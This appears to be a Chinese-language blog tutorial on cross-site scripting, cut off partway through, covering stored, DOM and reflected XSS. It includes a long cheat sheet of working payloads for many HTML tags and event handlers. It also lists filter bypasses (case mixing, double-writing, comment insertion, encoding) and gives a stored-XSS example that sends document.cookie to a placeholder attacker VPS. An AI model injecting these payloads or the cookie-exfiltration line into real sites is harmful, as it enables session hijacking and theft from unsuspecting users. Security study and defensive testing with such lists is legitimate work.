+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;1&lt;/h1&gt; （&lt;script&gt;alert(/xss/)&lt;/script&gt;）</span><br></pre></td></tr></table></figure></div>
+
+<p>没错，直接去js代码进行加载</p>
+<p>那么漏洞原因就出来了</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">程序软件对用户的输入输出没有做代码限制，导致用户可以输入一些js恶意代码；</span><br><span class="line">其他用户看到浏览到这些恶意脚本代码，就被浏览器执行，进而实现攻击目标；简单来说：xss就是前端rce</span><br></pre></td></tr></table></figure></div>
+
+<p>xss分为</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">存储型   高危：就是在评论区啊一些地方，我去评论一个恶意js代码，有人去点进行，发现被我去攻击</span><br><span class="line">例如：&lt;img src=x onerror=&quot;new Image().src=&#x27;http://你的VPS地址/steal?cookie=&#x27;+document.cookie&quot;&gt;</span><br><span class="line">dom型   中危</span><br><span class="line">反射型   低位</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260119222503245-1768834523445-5.png"
+                      alt="image-20260119222503245"
+                ></p>
+<p>存储型 xss</p>
+<p><strong>概念：</strong>&lt;存储型 XSS 发生在用户提交的数据被存储在服务器上，并在其他用户访问时被检索和显示的情况下。攻击者通过提交包含恶意脚本的数据，将其存储在服务器上，然后其他用户在访问相应页面时执行了这些脚本。(代码存储于服务器数据库中)</p>
+<p>DOM 型 xss</p>
+<p><strong>概念：</strong> DOM 型 XSS 发生在页面中存在可被 JavaScript 动态修改的 DOM 元素，并且恶意脚本通过修改 DOM 来执行的情况下。攻击者构造的 URL 或提交的数据，由 JavaScript 解析后修改了 DOM，导致了脚本的执行。</p>
+<p>DOM 型 XSS 是一种基于文档对象模型的跨站脚本攻击。它主要是通过修改页面的 DOM（文档对象模型）节点来执行恶意脚本。与传统的反射型 XSS 和存储型 XSS 不同，DOM – XSS 的恶意脚本执行并不依赖于服务器端将恶意脚本返回给客户端浏览器，而是在浏览器端通过操作 DOM 树来实现。</p>
+<p>注：</p>
+<p>一、DOM 全称 文档对象模型（Document Object Model）（树状模型）</p>
+<p>二、DOM 是什么 DOM 就是一个编程接口，就是一套 <a class="link"   target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=API&spm=1001.2101.3001.7020" >API<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。 DOM 是针对 HTML 文档、<a class="link"   target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=XML&spm=1001.2101.3001.7020" >XML<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 等文档的一套 API。就类似于 JDBC 是针对数据库的一套 API 一样。</p>
+<p>三、DOM 的用途 DOM 是用来访问或操作 HTML 文档、XHTML 文档、XML 文档中的节点元素。</p>
+<p>现在基本上所有的浏览器都都执行了 W3C 发布的 DOM 规范，所以在浏览器上就可以用 DOM 的这些 API。</p>
+<p>（它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分）</p>
+<p>反射型 xss</p>
+<p><strong>概念：</strong> &lt;非持久性&gt; 反射型 xss 发生在用户提交的数据被直接返回到页面，并在该页面上执行的情况下。攻击者通过构造包含恶意脚本的 URL，诱使用户点击该 URL，而服务器在响应中反射（显示）了恶意脚本。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260119222658167-1768834523445-4.png"
+                      alt="image-20260119222658167"
+                ></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line">常见标签语句</span><br><span class="line">・&lt;a&gt; 标签</span><br><span class="line"></span><br><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;x&quot; onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;x&quot; onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;xss&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;x&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;x&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br><span class="line">・&lt;img&gt; 标签</span><br><span class="line"></span><br><span class="line">&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;img src=x onerror=eval(&quot;alert(1)&quot;)&gt;</span><br><span class="line">&lt;img src=1 onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;img src=1 onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;img src=1 onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">・&lt;iframe&gt; 标签</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;test&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onload=&quot;alert(document.cookie)&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onload=&quot;base64,YWxlcnQoJ3hzcycpOw==&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br><span class="line">・&lt;audio&gt; 标签</span><br><span class="line"></span><br><span class="line">&lt;audio src=1 onerror=alert(1)&gt;</span><br><span class="line">&lt;audio&gt;&lt;source src=&quot;x&quot; onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/audio&gt;</span><br><span class="line">&lt;audio controls onfocus=eval(&quot;alert(&#x27;xss&#x27;);&quot;) autofocus=&quot;&quot;&gt;&lt;/audio&gt;</span><br><span class="line">&lt;audio controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;source src=&quot;x&quot;&gt;&lt;/audio&gt;</span><br><span class="line">・&lt;video&gt; 标签</span><br><span class="line"></span><br><span class="line">&lt;video src=x onerror=alert(1)&gt;</span><br><span class="line">&lt;video&gt;&lt;source onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br><span class="line">&lt;video controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br><span class="line">&lt;video controls onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;&lt;/video&gt;</span><br><span class="line">&lt;video controls onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br><span class="line">・&lt;svg&gt; 标签</span><br><span class="line"></span><br><span class="line">&lt;svg onload=javascript:alert(1)&gt;</span><br><span class="line">&lt;svg onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/svg&gt;</span><br><span class="line">・&lt;button&gt; 标签</span><br><span class="line"></span><br><span class="line">&lt;button onclick=alert(1)&gt;</span><br><span class="line">&lt;button onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onmousedown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/button&gt;</span><br><span class="line">・&lt;div&gt; 标签</span><br><span class="line"></span><br><span class="line">这个需要借助 url 编码来实现绕过</span><br><span class="line"></span><br><span class="line">&lt;div onmouseover=&#x27;alert(1)&#x27;&gt;DIV&lt;/div&gt;</span><br><span class="line">经过url编码：</span><br><span class="line">&lt;div onmouseover%3d&#x27;alert%26lpar%3b1%26rpar%3b&#x27;&gt;DIV&lt;%2fdiv&gt;</span><br><span class="line">・&lt;input&gt; 标签</span><br><span class="line"></span><br><span class="line">&lt;input onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;</span><br><span class="line">&lt;input onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onkeypress=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br><span class="line">・&lt;details&gt; 标签</span><br><span class="line"></span><br><span class="line">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/details&gt;</span><br><span class="line">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot; open=&quot;&quot;&gt;&lt;/details&gt;</span><br><span class="line">・&lt;form&gt; 标签</span><br><span class="line"></span><br><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;</span><br><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;</span><br><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;</span><br><span class="line">・&lt;p&gt; 标签</span><br><span class="line"></span><br><span class="line">&lt;p onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br><span class="line">&lt;p onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br><span class="line">&lt;p onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br><span class="line">&lt;p onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br><span class="line">・&lt;object&gt; 标签</span><br><span class="line"></span><br><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;</span><br><span class="line">・&lt;select&gt; 标签</span><br><span class="line"></span><br><span class="line">&lt;select onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;&lt;/select&gt;</span><br><span class="line">&lt;select onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/select&gt;</span><br><span class="line">&lt;select onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;&lt;/select&gt;</span><br><span class="line">・&lt;script&gt; 标签</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(123)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">事件属性</span><br><span class="line"></span><br><span class="line">FSCommand() （当从嵌入式 Flash 对象中执行时，攻击者可以使用它）</span><br><span class="line">onAbort() （当用户中止图像加载时）</span><br><span class="line">onActivate() （当对象被设置为活动元素时）</span><br><span class="line">onAfterPrint() （在用户打印或预览打印作业后激活）</span><br><span class="line">onAfterUpdate() （更新源对象中的数据后在数据对象上激活）</span><br><span class="line">onBeforeActivate() （在对象被设置为活动元素之前触发）</span><br><span class="line">onBeforeCopy()（攻击者在将选择复制到剪贴板之前执行攻击字符串 – 攻击者可以使用该execCommand(&quot;Copy&quot;)功能执行此操作）</span><br><span class="line">onBeforeCut() （攻击者在选择被切断之前执行攻击字符串）</span><br><span class="line">onBeforeDeactivate() （在 activeElement 从当前对象更改后立即触发）</span><br><span class="line">onBeforeEditFocus() （在可编辑元素中包含的对象进入 UI 激活状态之前或在选择可编辑容器对象时触发）</span><br><span class="line">onBeforePaste()（用户需要被诱骗粘贴或使用该execCommand(&quot;Paste&quot;)功能强制粘贴）</span><br><span class="line">onBeforePrint()（用户需要被欺骗打印或攻击者可以使用print()或execCommand(&quot;Print&quot;)功能）。</span><br><span class="line">onBeforeUnload() （用户需要被诱骗关闭浏览器 – 除非它是从父级生成的，否则攻击者无法卸载窗口）</span><br><span class="line">onBeforeUpdate() （在更新源对象中的数据之前激活数据对象）</span><br><span class="line">onBegin() （当元素的时间线开始时， onbegin 事件会立即触发）</span><br><span class="line">onBlur() （在加载另一个弹出窗口并且窗口失去焦点的情况下）</span><br><span class="line">onBounce() （当Marquee对象的行为属性设置为“备用”和Marquee的内容到达窗口的一侧时）</span><br><span class="line">onCellChange() （当数据提供者中的数据发生变化时触发）</span><br><span class="line">onChange() （选择、文本或 TEXTAREA 字段失去焦点并且其值已被修改）</span><br><span class="line">onClick() （有人点击表格）</span><br><span class="line">onContextMenu() （用户需要右键单击攻击区域）</span><br><span class="line">onControlSelect() （当用户即将对对象进行控件选择时触发）</span><br><span class="line">onCopy()（用户需要复制一些东西或者可以使用execCommand(&quot;Copy&quot;)命令来利用它）</span><br><span class="line">onCut()（用户需要复制一些东西或者可以使用execCommand(&quot;Cut&quot;)命令来利用它）</span><br><span class="line">onDataAvailable() （用户需要更改元素中的数据，否则攻击者可以执行相同的功能）</span><br><span class="line">onDataSetChanged() （当数据源对象公开的数据集更改时触发）</span><br><span class="line">onDataSetComplete() （触发以指示数据源对象中的所有数据都可用）</span><br><span class="line">onDblClick() （用户双击表单元素或链接）</span><br><span class="line">onDeactivate() （当 activeElement 从当前对象更改为父文档中的另一个对象时触发）</span><br><span class="line">onDrag() （要求用户拖动对象）</span><br><span class="line">onDragEnd() （要求用户拖动对象）</span><br><span class="line">onDragLeave() （要求用户将对象拖离有效位置）</span><br><span class="line">onDragEnter() （要求用户将对象拖动到有效位置）</span><br><span class="line">onDragOver() （要求用户将对象拖动到有效位置）</span><br><span class="line">onDragDrop() （用户将对象（例如文件）拖放到浏览器窗口上）</span><br><span class="line">onDragStart() （在用户开始拖动操作时发生）</span><br><span class="line">onDrop() （用户将对象（例如文件）拖放到浏览器窗口上）</span><br><span class="line">onEnd() （当时间线结束时触发 onEnd 事件。</span><br><span class="line">onError() （加载文档或图像会导致错误）</span><br><span class="line">onErrorUpdate() （在更新数据源对象中的关联数据时发生错误时触发数据绑定对象）</span><br><span class="line">onFilterChange() （当视觉过滤器完成状态更改时触发）</span><br><span class="line">onFinish() （攻击者可以在选框完成循环时创建利用）</span><br><span class="line">onFocus() （攻击者在窗口获得焦点时执行攻击字符串）</span><br><span class="line">onFocusIn() （攻击者在窗口获得焦点时执行攻击字符串）</span><br><span class="line">onFocusOut() （攻击者在窗口失去焦点时执行攻击字符串）</span><br><span class="line">onHashChange() （当文档当前地址的片段标识符部分更改时触发）</span><br><span class="line">onHelp() （攻击者在窗口处于焦点时用户点击 F1 时执行攻击字符串）</span><br><span class="line">onInput() （元素的文本内容通过用户界面更改）</span><br><span class="line">onKeyDown() （用户按下一个键）</span><br><span class="line">onKeyPress() （用户按下或按住某个键）</span><br><span class="line">onKeyUp() （用户释放密钥）</span><br><span class="line">onLayoutComplete() （用户必须打印或打印预览）</span><br><span class="line">onLoad() （攻击者在窗口加载后执行攻击字符串）</span><br><span class="line">onLoseCapture()（可以被releaseCapture()方法利用）</span><br><span class="line">onMediaComplete() （当使用流媒体文件时，此事件可能会在文件开始播放之前触发）</span><br><span class="line">onMediaError() （用户在浏览器中打开一个包含媒体文件的页面，出现问题时触发该事件）</span><br><span class="line">onMessage() （当文档收到消息时触发）</span><br><span class="line">onMouseDown() （攻击者需要让用户点击图片）</span><br><span class="line">onMouseEnter() （光标在对象或区域上移动）</span><br><span class="line">onMouseLeave() （攻击者需要让用户将鼠标悬停在图像或表格上，然后再次关闭）</span><br><span class="line">onMouseMove() （攻击者需要让用户将鼠标悬停在图像或表格上）</span><br><span class="line">onMouseOut() （攻击者需要让用户将鼠标悬停在图像或表格上，然后再次关闭）</span><br><span class="line">onMouseOver() （光标在对象或区域上移动）</span><br><span class="line">onMouseUp() （攻击者需要让用户点击图片）</span><br><span class="line">onMouseWheel() （攻击者需要让用户使用他们的鼠标滚轮）</span><br><span class="line">onMove() （用户或攻击者会移动页面）</span><br><span class="line">onMoveEnd() （用户或攻击者会移动页面）</span><br><span class="line">onMoveStart() （用户或攻击者会移动页面）</span><br><span class="line">onOffline() （发生在浏览器在联机模式下工作并且开始脱机工作时）</span><br><span class="line">onOnline() （发生在浏览器在离线模式下工作并开始在线工作时）</span><br><span class="line">onOutOfSync() （中断元素播放时间轴定义的媒体的能力）</span><br><span class="line">onPaste()（用户需要粘贴或攻击者可以使用该execCommand(&quot;Paste&quot;)功能）</span><br><span class="line">onPause() （当时间线暂停时，onpause 事件会在每个处于活动状态的元素上触发，包括 body 元素）</span><br><span class="line">onPopState() （当用户浏览会话历史时触发）</span><br><span class="line">onProgress() （攻击者会在加载 Flash 电影时使用它）</span><br><span class="line">onPropertyChange() （用户或攻击者需要更改元素属性）</span><br><span class="line">onReadyStateChange() （用户或攻击者需要更改元素属性）</span><br><span class="line">onRedo() （用户在撤消交易历史中前进）</span><br><span class="line">onRepeat() （该事件为时间线的每次重复触发一次，不包括第一个完整周期）</span><br><span class="line">onReset() （用户或攻击者重置表单）</span><br><span class="line">onResize()（用户将调整窗口的大小，攻击者就可以自动与像初始化：&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;）</span><br><span class="line">onResizeEnd()（用户将调整窗口的大小，攻击者就可以自动与像初始化：&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;）</span><br><span class="line">onResizeStart()（用户将调整窗口的大小，攻击者就可以自动与像初始化：&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;）</span><br><span class="line">onResume() （onresume 事件会在时间线恢复时激活的每个元素上触发，包括 body 元素）</span><br><span class="line">onReverse() （如果元素的 repeatCount 大于 1，则每次时间线开始向后播放时都会触发此事件）</span><br><span class="line">onRowsEnter() （用户或攻击者需要更改数据源中的一行）</span><br><span class="line">onRowExit() （用户或攻击者需要更改数据源中的一行）</span><br><span class="line">onRowDelete() （用户或攻击者需要删除数据源中的一行）</span><br><span class="line">onRowInserted() （用户或攻击者需要在数据源中插入一行）</span><br><span class="line">onScroll()（用户需要滚动，否则攻击者可以使用该scrollBy()功能）</span><br><span class="line">onSeek() （当时间轴设置为向前以外的任何方向播放时，将触发 onreverse 事件）</span><br><span class="line">onSelect()（用户需要选择一些文本-攻击者可以自动初始化是这样的：window.document.execCommand(&quot;SelectAll&quot;);）</span><br><span class="line">onSelectionChange()（用户需要选择一些文本-攻击者可以自动初始化是这样的：window.document.execCommand(&quot;SelectAll&quot;);）</span><br><span class="line">onSelectStart()（用户需要选择一些文本-攻击者可以自动初始化是这样的：window.document.execCommand(&quot;SelectAll&quot;);）</span><br><span class="line">onStart() （在每个选框循环开始时触发）</span><br><span class="line">onStop() （用户需要按停止按钮或离开网页）</span><br><span class="line">onStorage() （存储区域已更改）</span><br><span class="line">onSyncRestored() （用户中断元素播放由时间线定义的媒体的能力以触发）</span><br><span class="line">onSubmit() （需要攻击者或用户提交表单）</span><br><span class="line">onTimeError() （用户或攻击者将时间属性（例如 dur）设置为无效值）</span><br><span class="line">onTrackChange() （用户或攻击者更改播放列表中的曲目）</span><br><span class="line">onUndo() （用户在撤消事务历史记录中倒退）</span><br><span class="line">onUnload() （当用户单击任何链接或按下后退按钮或攻击者强制单击时）</span><br><span class="line">onURLFlip() （当由 HTML+TIME（定时交互式多媒体扩展）媒体标签播放的高级流格式 (ASF) 文件处理嵌入在 ASF 文件中的脚本命令时，将触发此事件）</span><br><span class="line">seekSegmentTime() （这是一种在元素的片段时间线上定位指定点并从该点开始播放的方法。片段由时间线的一次重复组成，包括使用 AUTOREVERSE 属性的反向播放。）</span><br></pre></td></tr></table></figure></div>
+
+<p>绕过</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># xss绕过</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 1，换标签函数绕过</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">一个不好使、换另一个；</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line"><span class="comment">## 2，大小写绕过</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">123<span class="string">&#x27;&quot;&gt;&lt;SCRipt&gt;alert(111111111)&lt;/SCRipt&gt;</span></span><br><span class="line"><span class="string">```</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">## 3，长度限制</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">```bash</span></span><br><span class="line"><span class="string">修改前端代码</span></span><br><span class="line"><span class="string">```</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">## 4，双写绕过</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">```bash</span></span><br><span class="line"><span class="string">123&#x27;</span><span class="string">&quot;&gt;&lt;scr&lt;script&gt;ipt&gt;alert(111111111)&lt;/scr&lt;/script&gt;ipt&gt;</span></span><br><span class="line"><span class="string">```</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">## 5，注释绕过</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">```bash</span></span><br><span class="line"><span class="string">&lt;!--注释信息--&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">123&#x27;&quot;</span>&gt;&lt;scr&lt;!--注释信息--&gt;ipt&gt;alert(111111111)&lt;/scr&lt;!--注释信息--&gt;ipt&gt;</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line"><span class="comment">## 6，事件属性绕过</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">123<span class="string">&#x27;&quot;&gt;&lt;img src=&quot;#&quot; onerror=&quot;alert(111111111)&quot;&gt;</span></span><br><span class="line"><span class="string">```</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">## 7，编码绕过</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">```bash</span></span><br><span class="line"><span class="string"># 实体化</span></span><br><span class="line"><span class="string">123&#x27;</span><span class="string">&quot;&gt;&lt;img src=&quot;</span>#<span class="string">&quot; 